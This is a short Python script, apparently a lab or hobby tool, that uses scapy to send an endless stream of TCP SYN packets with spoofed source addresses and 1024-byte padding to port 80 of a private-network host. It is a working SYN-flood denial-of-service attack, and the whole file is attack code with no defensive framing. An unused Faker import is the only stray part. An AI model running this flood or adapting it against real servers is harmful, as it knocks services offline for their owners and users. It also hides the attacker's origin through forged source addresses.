from scapy.all import *
from faker import Faker

conf.verb = 0

host = "192.168.0.7"
port = 80

origenIP = "192.168.0."
endIP = 10

packet_number = 0

while True:    
    packet_number += 1 
    packet = scapy.all.IP(src= (origenIP+str(endIP)), dst= host) / scapy.all.TCP(sport= RandShort(), dport= port, flags="S")/Raw(b"X"*1024)
    send(packet, inter= 0.0002, verbose=False)  
    print("Packet %d sent" %packet_number)
    endIP += 1 
    if(endIP == 200):
        endIP = 10
